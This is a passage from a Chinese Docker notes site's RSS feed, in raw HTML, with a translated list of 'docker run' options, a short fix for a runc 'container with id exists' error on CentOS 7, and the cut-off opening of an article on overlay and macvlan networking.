<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --gpus</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gpu-request</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GPU设备添加到容器（'all'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 传递所有</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GPU）</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> # 讲gpu和nvidia-smi都传进容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --group-add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 添加要加入的其他组</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --health-cmd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 运行检查健康状况的命令</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --health-interval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> duration</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 运行检查之间的时间</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (ms|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">m</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">h</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">默认</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --health-retries</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 需要报告不健康的连续失败</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --health-start-period</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> duration</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器在开始健康重试倒计时之前初始化的开始时间（ms</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">m</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">h）（默认</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0s）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --health-timeout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> duration</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 允许运行一项检查的最长时间</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (ms|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">m</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">h</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">默认</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --help</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 打印用法</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -h,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hostname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 字符串</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器主机名</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --init</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 在容器中运行一个</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> init</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 来转发信号并获取进程</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -i,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --interactive</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 保持</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> STDIN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 打开，即使没有附加</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 字符串</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IPv4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 地址（例如，172.30.100.104）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --ip6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 字符串</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IPv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 地址（例如，2001:db8::33）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --ipc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 要使用的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IPC</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 模式</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --isolation</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器隔离技术</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --kernel-memory</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 内核内存限制</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -l,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --label</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 在容器上设置元数据</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --label-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 读取以行分隔的标签文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 添加到另一个容器的链接</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --link-local-ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IPv4/IPv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 链接本地地址</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --log-driver</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器的日志驱动</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --log-opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 日志驱动选项</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --mac-address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MAC</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 地址（例如，92:d0:c6:0a:29:33）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-m,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --memory</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 内存限制</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --memory-reservation</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 内存软限制</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --memory-swap</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 交换限制等于内存加上交换：'-1'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 启用无限交换</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --memory-swappiness</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 调整容器内存交换量（0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 到</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 100）（默认</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -1）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --mount</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mount</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将文件系统挂载附加到容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 为容器分配一个名称</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将容器连接到网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --network-alias</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 为容器添加网络范围的别名</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --no-healthcheck</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 禁用任何容器指定的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> HEALTHCHECK</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --oom-kill-disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 禁用</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OOM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 杀手</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --oom-score-adj</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 调整主机的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OOM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 首选项（-1000</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 到</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1000）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --pid</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 字符串</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 要使用的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 命名空间</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --pids-limit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 调整容器</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pids</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 限制（设置</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 表示无限制）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --platform</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 如果服务器支持多平台，则设置平台</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --privileged</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 给这个容器扩展权限</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -p,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --publish</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将容器的端口发布到主机</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -P,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --publish-all</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将所有暴露的端口发布到随机端口</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --pull</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 运行前拉取图片</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"always"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"missing"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"never"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">默认</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"missing"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --read-only</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将容器的根文件系统挂载为只读</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器退出时应用的重启策略（默认“no”）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --rm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器退出时自动删除</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --runtime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 用于此容器的运行时间</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --security-opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 列出安全选项</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --shm-size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/shm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 的大小</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --sig-proxy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 代理接收到进程的信号（默认为真）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --stop-signal</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 停止容器的信号（默认“SIGTERM”）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --stop-timeout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 停止容器的超时时间（以秒为单位）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --storage-opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 列出容器的存储驱动程序选项</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --sysctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> map</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Sysctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 选项（默认</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> map[]）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 挂载一个</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 目录</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -t,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --tty</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 分配一个伪</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TTY</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --ulimit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ulimit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Ulimit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 选项（默认</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> []）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -u,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 字符串用户名或</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UID（格式：</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">uid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">[</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;group|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">gid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">]）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --userns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 要使用的用户命名空间</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --uts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 要使用的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UTS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 命名空间</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -v,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --volume</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 绑定挂载一个卷</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --volume-driver</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器的可选卷驱动程序</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --volumes-from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 从指定容器挂载卷</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -w,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --workdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器内的工作目录</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker老版本runc报错无法启动</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E8%80%81%E7%89%88%E6%9C%ACrunc%E6%8A%A5%E9%94%99%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E8%80%81%E7%89%88%E6%9C%ACrunc%E6%8A%A5%E9%94%99%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker老版本runc报错无法启动</source>
      <description>Docker老版本runc报错无法启动 系统: CentOS 7 Docker版本: 1.13.1 问题概述 执行命令 docker start container-name 无法启动， 报错如下 解决方案 出现原因是docker误认为runc状态错误，这里实际上是docker的bug。 解决方法是从内存中删除错误的状态。</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>系统: CentOS 7
Docker版本: 1.13.1</p>
</blockquote>
<h2>问题概述</h2>
<p>执行命令 <code>docker start container-name</code> 无法启动， 报错如下</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Error</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> response</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OCI</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> runtime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failed:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> container</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> with</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> id</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exists:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">aaabbbbccccddd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Error:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> containers:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> container-name</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>解决方案</h2>
<p>出现原因是docker误认为runc状态错误，这里实际上是docker的bug。 解决方法是从内存中删除错误的状态。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/runc/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rfv</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aaabbbbccccddd</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker跨宿主机通信overlay和macvlay</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E8%B7%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E9%80%9A%E4%BF%A1overlay%E5%92%8Cmacvlay.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E8%B7%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E9%80%9A%E4%BF%A1overlay%E5%92%8Cmacvlay.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker跨宿主机通信overlay和macvlay</source>
      <description>Docker跨宿主机通信overlay和macvlay 前言 本讲是从Docker系列讲解课程，单独抽离出来的一个小节，带你一起 深入了解在编排工具出现前，跨宿主机通信的两大得力干将overlay、macvlay，这也会后期学好K8s做好基本功铺垫，打下一个坚实的基础。 一、overlay Overlay网络模式相比于桥接模式的特别之处在于，它可以自定...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>前言</h2>
<blockquote>
<p>本讲是从Docker系列讲解课程，单独抽离出来的一个小节，带你一起 深入了解在编排工具出现前，跨宿主机通信的两大得力干将overlay、macvlay，这也会后期学好K8s做好基本功铺垫，打下一个坚实的基础。</p>
</blockquote>
<h2>一、overlay</h2>
<blockquote>
